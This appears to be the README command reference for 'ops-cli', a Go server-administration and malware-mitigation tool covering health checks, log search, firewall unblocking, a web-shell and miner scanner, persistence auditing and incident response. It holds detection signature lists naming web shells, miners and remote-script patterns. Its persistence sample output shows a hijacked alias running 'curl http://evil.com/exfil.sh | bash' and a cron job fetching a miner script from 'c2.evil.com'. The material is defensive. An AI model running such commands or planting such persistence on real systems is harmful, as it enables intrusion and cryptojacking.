# 📖 ops-cli: Operator's Field Guide

This is the authoritative command reference for `ops-cli`. Every flag, expected output, exact default, and decision path is sourced directly from the source code.

> **Pre-requisite:** Build the binary once and place it on your `$PATH`.
> ```bash
> go build -o ops-cli .
> sudo mv ops-cli /usr/local/bin/
> ```

---

## Global Flags

These apply to **every** command and subcommand.

| Flag | Short | Type | Default | Description |
|:---|:---|:---|:---|:---|
| `--json` | — | bool | `false` | Output as structured JSON instead of human text. Ideal for piping into Grafana, Splunk, or `jq`. |
| `--help` | `-h` | — | — | Print usage for the current command. |

---

## 1. `system` — Live Health Snapshot

Reads OS state directly from `/proc/meminfo` and `/proc/loadavg`. No syscalls, no CGO.

```
ops-cli system [--json]
```

**Sample Text Output:**
```
System Health Report at Sun, 22 Feb 2026 18:00:00 +0530
----------------------------------------
OS: linux/amd64
CPUs: 8
Load Average: 1.43 0.87 0.72 3/512 12345
Memory: Used 3.21 GB / Total 15.62 GB
----------------------------------------
```

**Sample JSON Output:**
```json
{
  "os": "linux",
  "arch": "amd64",
  "cpus": 8,
  "mem_total": 16777216000,
  "mem_free": 13563428000,
  "load": "1.43 0.87 0.72 3/512 12345"
}
```

> **Note:** Memory uses `MemAvailable` from `/proc/meminfo` (preferred), falling back to `MemFree`. On non-Linux systems, memory is reported as unavailable — `system` is a Linux-only command.

---

## 2. `disk` — Disk Usage Analysis

Walks one or more directories and reports the top-N largest files and directories.

```
ops-cli disk [paths...] [flags]
```

| Flag | Short | Default | Description |
|:---|:---|:---|:---|
| `--top` | `-n` | `5` | Number of top results to display for files and directories |
| `--min-size` | — | `1` | Minimum file size in **MB** to include in the report |

**Examples:**

```bash
# Default: scan current directory, top 5 items >= 1 MB
ops-cli disk

# Scan /var/log and /home, show top 10 items >= 50 MB
ops-cli disk /var/log /home --top 10 --min-size 50

# Output as JSON for monitoring integration
ops-cli disk /home --top 20 --json
```

**Sample Text Output:**
```
Top 5 Largest Files:
2048.00 MB  /home/user1/backup.tar.gz
512.34 MB   /var/log/httpd/access_log
...

Top 5 Largest Directories (Direct Content):
8192.00 MB  /home/user1
1024.00 MB  /var/log
...
```

---

## 3. `logs` — Unified Log Search

Streams log files line-by-line using `bufio.Scanner`. Handles multi-GB logs without memory pressure.

```
ops-cli logs <apache|exim|mysql|system> --query <string> [flags]
```

| Flag | Short | Default | Description |
|:---|:---|:---|:---|
| `--query` | `-q` | *(required)* | Exact string to search for (case-sensitive) |
| `--limit` | `-l` | `50` | Maximum number of matching lines to return |

**Log File Paths (hardcoded):**

| Subcommand | Log File Path |
|:---|:---|
| `apache` | `/usr/local/apache/logs/error_log` |
| `exim` | `/var/log/exim_mainlog` |
| `mysql` | `/var/log/mysqld.log` |
| `system` | `/var/log/messages` (falls back to `/var/log/syslog`) |

**Examples:**

```bash
# Find PHP fatal errors in Apache logs (last 20 matches)
ops-cli logs apache --query "PHP Fatal error" --limit 20

# Trace a rejected sender in Exim
ops-cli logs exim --query "rejected" --query "spammer@example.com" --limit 30

# Find OOM events in system logs
ops-cli logs system --query "Out of memory" --limit 5

# JSON output for alerting pipeline
ops-cli logs apache --query "segmentation fault" --json
```

**Sample Text Output:**
```
[/usr/local/apache/logs/error_log:1423] PHP Fatal error: Call to undefined function...
[/usr/local/apache/logs/error_log:2891] PHP Fatal error: Maximum execution time...
```

---

## 4. `network` — Firewall Management

Detects active firewalls (`CSF` → `Firewalld` → `IPTables`) and manages blocked IPs with a single interface.

```
ops-cli network <check|unblock> --ip <IP_ADDRESS>
```

| Flag | Default | Description |
|:---|:---|:---|
| `--ip` | *(required)* | Target IPv4 address |

**Examples:**

```bash
# Check if an IP is blocked across all detected firewalls
ops-cli network check --ip 1.2.3.4

# Unblock an IP (auto-detects which firewall to remove from)
ops-cli network unblock --ip 1.2.3.4

# JSON output for incident logging
ops-cli network check --ip 1.2.3.4 --json
```

**Decision flow for `unblock`:**
1. Calls `check` internally to identify which firewall holds the block.
2. If no block is found, logs `No active block found` and exits cleanly.
3. If a block is found, removes it from the correct backend (`csf -dr`, `firewall-cmd --remove`, or `iptables -D`).

**Sample JSON:**
```json
{"ip": "1.2.3.4", "firewall": "csf", "blocked": "true"}
```

---

## 5. `security` — Auditing & Evidence Packaging

### `security harden` — Configuration Audit

Reads config files and checks for the presence of expected security directives. **Read-only — no changes are made.**

```bash
ops-cli security harden
```

**Checks performed:**

| Check Name | File | Expected Pattern |
|:---|:---|:---|
| SSH Root Login | `/etc/ssh/sshd_config` | `PermitRootLogin no` |
| FTP Anonymous | `/etc/pure-ftpd/pure-ftpd.conf` | `NoAnonymous yes` |

**Sample Output:**
```
[PASS] SSH Root Login: /etc/ssh/sshd_config
[FAIL] FTP Anonymous: /etc/pure-ftpd/pure-ftpd.conf
```

> `[PASS]` means the pattern was found. `[FAIL]` means it was not found (config is missing or commented out). A `WARN` in the log means the file could not be opened (likely doesn't exist on this server's stack).

---

### `security abuse [DOMAIN]` — Evidence Packager

Collects log files for a domain and writes a zip archive for abuse submission. Uses Go's native `archive/zip` — no system `zip` binary needed.

```bash
ops-cli security abuse example.com
```

**Files collected:**

| Log | Path |
|:---|:---|
| System Messages | `/var/log/messages` |
| Exim Mail Log | `/var/log/exim_mainlog` |
| Apache Domain Log | `/var/log/apache2/domlogs/<DOMAIN>` |

**Output file:** `<DOMAIN>_abuse_<UNIX_TIMESTAMP>.zip` (created in the current working directory)

```bash
# Example output
example.com_abuse_1708612345.zip
```

> Files that don't exist on the server are skipped with a `WARN` log — the zip is still created with whatever is available.

---

## 6. `forensics` — Malware Mitigation Suite

### `forensics scan` — Parallel Malware Scanner

Runs an **8-worker goroutine pool** across a directory tree. For each file, it performs two detection passes.

```
ops-cli forensics scan --path <DIR> [--quarantine <DIR>] [--json]
```

| Flag | Short | Default | Description |
|:---|:---|:---|:---|
| `--path` | `-p` | `.` | Root directory to scan recursively |
| `--quarantine` | — | *(none)* | If set, moves detected files to this directory |

**Detection Pass 1 — Signature Matching (line-by-line):**

| Signature Name | Matched String |
|:---|:---|
| Obfuscated PHP | `eval(base64_decode` |
| FilesMan Shell | `FilesMan` |
| WSO Web Shell | `wso_version` |
| Suspicious Exec | `exec($_POST` |
| Suspicious System | `system($_GET` |
| R57 Shell | `r57shell` |
| C99 Shell | `c99shell` |
| XMRig Miner | `xmrig` |
| Stratum Protocol | `stratum+tcp` |
| Cryptonight Algo | `cryptonight` |
| Miner Config | `"donate-level":` |
| Miner Pool | `pool.supportxmr.com` |

**Detection Pass 2 — Shannon Entropy Analysis:**

Applied to the **first 4 KB** of any file that passes signature scanning. Files with entropy **> 5.5** are flagged as `High Entropy (X.XX)`.

> Scale: `0.0` = uniform data, `8.0` = fully random.
> - Normal PHP/HTML/JS: `< 5.0`
> - Encrypted payloads, Rondo/polymorphic malware: `> 7.0`
> - Threshold of `5.5` catches obfuscated code while minimizing false positives on minified JS.

**Immutability Handling:** For each detection, the scanner checks the `chattr` immutable bit (`+i`). If set, it automatically runs `chattr -i` to unlock before quarantine.

**Quarantine behavior:**
- Creates `<QUARANTINE_DIR>/<TIMESTAMP>_<FILENAME>.quarantine`
- Saves a JSON sidecar: `<QUARANTINE_DIR>/<TIMESTAMP>_<FILENAME>.quarantine.json`
  ```json
  {
    "original_path": "/home/user/public_html/shell.php",
    "quarantined_at": "2026-02-22T18:00:00Z",
    "original_mode": 420
  }
  ```

**Exit Code:** `1` if detections found (CI/CD compatible), `0` if clean.

**Examples:**

```bash
# Dry scan — report only, no file moves
ops-cli forensics scan --path /home/user/public_html

# Scan and quarantine
ops-cli forensics scan --path /home --quarantine /root/quarantine

# JSON output (pipe to SIEM)
ops-cli forensics scan --path /var/www --json | tee scan_results.json

# Scan as part of a CI/CD gate (non-zero exit on detection)
ops-cli forensics scan --path /deploy/release && echo "Clean" || echo "THREATS FOUND"
```

---

### `forensics timeline` — File Modification Audit

Reports all files modified within a time window. Use this after a suspected compromise to identify what was changed.

```
ops-cli forensics timeline --path <DIR> [--since <DURATION>] [--json]
```

| Flag | Short | Default | Description |
|:---|:---|:---|:---|
| `--path` | `-p` | `.` | Root directory to search |
| `--since` | `-t` | `24h` | Time window in Go duration format |

**Duration examples:** `30m`, `2h`, `24h`, `72h`, `168h` (1 week)

**Examples:**

```bash
# Show all files changed in the last 6 hours in a user's web root
ops-cli forensics timeline --path /home/user/public_html --since 6h

# Broad scan across all home directories for the last 3 days
ops-cli forensics timeline --path /home --since 72h --json
```

**Sample Text Output:**
```
Displaying 4 file events in the last 6h:
[2026-02-22T16:34:12+05:30] /home/user/public_html/wp-config.php (3421 bytes)
[2026-02-22T17:01:44+05:30] /home/user/public_html/.htaccess (512 bytes)
```

---

### `forensics persistence` — Shell Init & Cron Audit

Scans shell initialization files and all crontab locations for indicators of attacker persistence. Runs against the **current user's home directory** automatically.

```bash
ops-cli forensics persistence [--json]
```

**Files scanned:**
- `/etc/profile`, `/etc/bash.bashrc`
- `~/.bashrc`, `~/.profile`, `~/.bash_profile`, `~/.bash_logout`
- `/etc/crontab`
- `/etc/cron.d/`, `/etc/cron.daily/`, `/etc/cron.hourly/`, `/etc/cron.monthly/`, `/etc/cron.weekly/`
- `/var/spool/cron/crontabs/`, `/var/spool/cron/`

**Anomaly types detected:**

| Anomaly Type | Detection Logic |
|:---|:---|
| `Command Hijack (Alias)` | `alias ls=`, `alias sudo=`, `alias ssh=` etc. (10 common commands) |
| `Remote Script Execution` | `curl … \| bash` or `wget … \| sh` in init files |
| `Hidden path/memory execution` | References to `/. `, `/.hidden`, or `/dev/shm` |
| `Background Persistence` | Lines ending with `&` (background process launch) |
| `Cron: Remote Script/Download` | `curl`/`wget` + `http` + `\| bash` or `\| sh` in cron files |
| `Cron: Suspicious execution path` | `/tmp` or `/dev/shm` in cron commands |
| `Cron: Encoded/Inline payload` | `base64`, `python -c`, `perl -e`, `php -r` in cron files |

**Sample Output:**
```
[Command Hijack (Alias)] /root/.bashrc: alias ls='ls --indicator-style=none; curl http://evil.com/exfil.sh | bash'
[Cron: Remote Script/Download] /var/spool/cron/crontabs/www-data: */5 * * * * wget http://c2.evil.com/mine.sh | bash
```

**Exit Code:** `1` if anomalies found, `0` if clean.

---

### `forensics restore` — Quarantine Management

Restores files using the JSON sidecar metadata saved during quarantine. Preserves original path, parent directory structure, and file permissions.

```
ops-cli forensics restore [--file <PATH>] [--all --quarantine <DIR>]
```

| Flag | Default | Description |
|:---|:---|:---|
| `--file` | *(none)* | Path to a specific `.quarantine` file to restore |
| `--all` | `false` | Restore all `.quarantine` files in the quarantine dir |
| `--quarantine` | *(none)* | Path to quarantine directory (required with `--all`) |

**Examples:**

```bash
# Restore a single false-positive
ops-cli forensics restore --file /root/quarantine/1708001234_config.php.quarantine

# Restore everything from a quarantine directory
ops-cli forensics restore --all --quarantine /root/quarantine
```

> The original file is moved back with `os.Rename`, not copied — no data duplication. Permissions are restored from the metadata. The `.json` sidecar is deleted after a successful restore.

---

## 7. `monitor` — TCP Stack Observability

Parses `/proc/net/tcp` directly using little-endian hex decoding. Zero external dependencies.

### `monitor connections` — Connection State Breakdown

```bash
ops-cli monitor connections [--json]
```

**Sample Text Output:**
```
TCP Statistics:
Total Connections: 342
By State:
  ESTABLISHED : 289
  TIME_WAIT   : 41
  LISTEN      : 8
  SYN_RECV    : 4
```

---

### `monitor backlog` — Listen Queue Health

Lists all ports with non-zero Rx or Tx queue values. A non-zero queue means incoming connections are waiting — a sign of service saturation.

```bash
ops-cli monitor backlog [--json]
```

**Sample Output (no issues):**
```
INFO listening queues are healthy
```

**Sample Output (under load):**
```
WARN backlog detected on ports [80 443]
```

---

### `monitor thundering` — Thundering Herd Detection

Counts connections in `SYN_RECV` state and alerts if the count exceeds the threshold.

```
ops-cli monitor thundering [--threshold <INT>] [--json]
```

| Flag | Default | Description |
|:---|:---|:---|
| `--threshold` | `100` | Alert if `SYN_RECV` connection count exceeds this value |

```bash
# Default threshold (100)
ops-cli monitor thundering

# Custom threshold for a high-traffic server
ops-cli monitor thundering --threshold 500
```

**Sample Warn Output:**
```
WARN Thundering Herd Detected: 143 connections in SYN_RECV state (threshold: 100)
```

---

### `monitor serve` — Prometheus Metrics Exporter

Starts an HTTP server exposing TCP socket state as Prometheus-compatible metrics. Updates every poll cycle.

```
ops-cli monitor serve [--addr <:PORT>]
```

| Flag | Default | Description |
|:---|:---|:---|
| `--addr` | `:9090` | Listen address for the metrics endpoint |

```bash
# Start on default port
ops-cli monitor serve

# Start on a custom port
ops-cli monitor serve --addr :9091
```

**Exported metrics:**
```
# HELP tcp_connections_total Total number of TCP connections
tcp_connections_total 342

# Per-state examples
tcp_state_established 289
tcp_state_time_wait 41
tcp_state_syn_recv 4
tcp_state_listen 8
```

> To run continuously as a background sidecar:
> ```bash
> nohup ops-cli monitor serve --addr :9090 &>/var/log/ops-monitor.log &
> ```

---

## 8. `optimize` — Performance Tuning Calculator

Calculates recommended settings based on actual system RAM. Read-only — outputs recommendations only.

```bash
ops-cli optimize
```

**Formulas (matching `optimize.sh` logic):**

| Setting | Formula | Config Location |
|:---|:---|:---|
| Apache `MaxRequestWorkers` | `floor((RAM_MB - 2048) / 60)` | Apache `httpd.conf` / `apache2.conf` |
| MySQL `innodb_buffer_pool_size` | `256M` if RAM < 2048 MB, else `512M` | `my.cnf` / `my.ini` |

**Sample Output:**
```
Optimization Recommendations:
------------------------------
Detected System Memory: 16384 MB
[Apache] Recommended MaxRequestWorkers: 239
[MySQL] Recommended innodb_buffer_pool_size: 512M

To apply these changes, utilize configuration management tools or edit configs manually.
```

> Falls back to **4096 MB** as the assumed RAM value if `/proc/meminfo` is unavailable (non-Linux).

---

## 9. `email` — Exim Log Analyzer

Parses `/var/log/exim_mainlog` for message arrival events (lines containing `<=`) and produces a traffic summary. This is the Go replacement for `ec.pl`.

```bash
ops-cli email
```

**Sample Output:**
```
Email Traffic Summary
---------------------
Total Emails Processed: 14823

Top 10 Senders:
 3421 spammer@compromised-domain.com
  892 admin@example.com
  ...
```

> Sender detection uses the `<=` marker in Exim's log format:
> ```
> 2026-02-22 12:00:00 1abcXX-000123-45 <= sender@example.com H=...
> ```

---

## 10. `response` — Automated Incident Response

Runs a battery of health checks against the live system and optionally executes remediations.

> **Default is `--dry-run=true`. No actions are taken without explicitly setting `--dry-run=false`.**

```
ops-cli response [--dry-run=<bool>] [--json]
```

| Flag | Default | Description |
|:---|:---|:---|
| `--dry-run` | `true` | Simulate all remediations. Set `false` to execute. |

**Checks and their logic:**

| Check | Data Source | Threshold / Logic | Remediation (if `--dry-run=false`) |
|:---|:---|:---|:---|
| `System Load` | `/proc/loadavg` (1-min avg) | Alert if load > **5.0** | None — informational |
| `Service: httpd` | TCP connect `localhost:80` (2s timeout) | Alert if connection refused | `systemctl restart httpd` |
| `Service: mysql` | TCP connect `localhost:3306` (2s timeout) | Alert if connection refused | `systemctl restart mysql` |
| `Active Cryptominer` | Scans `/proc/<PID>/cmdline` for all PIDs | Matches 9 keyword signatures | `SIGKILL` the matching PID |
| `OOM Killer Audit` | `/var/log/syslog`, `/var/log/messages`, `/var/log/kern.log` | Scans for `Out of memory` or `invoked oom-killer` | None — informational |
| `Process Terminator Detection` | Scans `/proc/<PID>/comm` for all PIDs | Matches: `oomd`, `earlyoom`, `monit`, `watchdog` | None — informational |

**Cryptominer keyword signatures:**
`stratum+tcp`, `xmrig`, `minerd`, `cpuminer`, `nicehash`, `xmr-stak`, `cryptonight`, `nanopool`, `monero`

**Examples:**

```bash
# Safe audit pass — see what would be acted on
ops-cli response

# Live remediation — restart downed services, kill miners
ops-cli response --dry-run=false

# JSON audit report (write to file for monitoring)
ops-cli response --json > /tmp/health_report.json

# Non-zero exit on incident (for Nagios/PagerDuty integration)
ops-cli response --json && echo "OK" || echo "CRITICAL: incident detected"
```

**Sample text output (incident found, dry-run):**
```
WARN check=System Load error="load average 1m (8.43) exceeds threshold (5.00)"
INFO Dry-Run: Would execute remediation action=ServiceRestart[httpd]
WARN check="Active Cryptominer" error="suspicious miner process detected (PID 21045): xmrig --url stratum+tcp://pool..."
INFO Dry-Run: Would execute remediation action=ProcessKill[21045]
```

**Exit Code:** `1` if any incidents are detected, `0` if system is healthy.

---

## Operational Patterns

### Incident Triage Workflow

```bash
# Step 1: Quick system snapshot
ops-cli system

# Step 2: Check service health and detect active threats (safe)
ops-cli response

# Step 3: If miner or compromised, scan the web root
ops-cli forensics scan --path /home --quarantine /root/quarantine

# Step 4: Check what changed recently
ops-cli forensics timeline --path /home --since 24h

# Step 5: Check for persistent backdoors
ops-cli forensics persistence

# Step 6: If a firewall block is suspected for a client IP
ops-cli network check --ip 1.2.3.4
```

### Log Aggregation Pipeline

```bash
# Pipe all check results to a SIEM as newline-delimited JSON
ops-cli response --json | tee health_report.json
ops-cli forensics scan --path /home --json | tee scan_report.json
ops-cli monitor connections --json | tee tcp_report.json
```

### Cron-Based Scheduled Audit

```bash
# /etc/cron.d/ops-audit
0 */6 * * * root /usr/local/bin/ops-cli response --json >> /var/log/ops-health.json
0 2   * * * root /usr/local/bin/ops-cli forensics scan --path /home --quarantine /root/quarantine --json >> /var/log/ops-forensics.json
```

---

> [!NOTE]
> All `ops-cli` operations are operator-centric. The engine provides the speed and mathematical precision; you provide the parameters, interpret the results, and authorize the remediation.

**Built by Nihar.** 🛡️✨
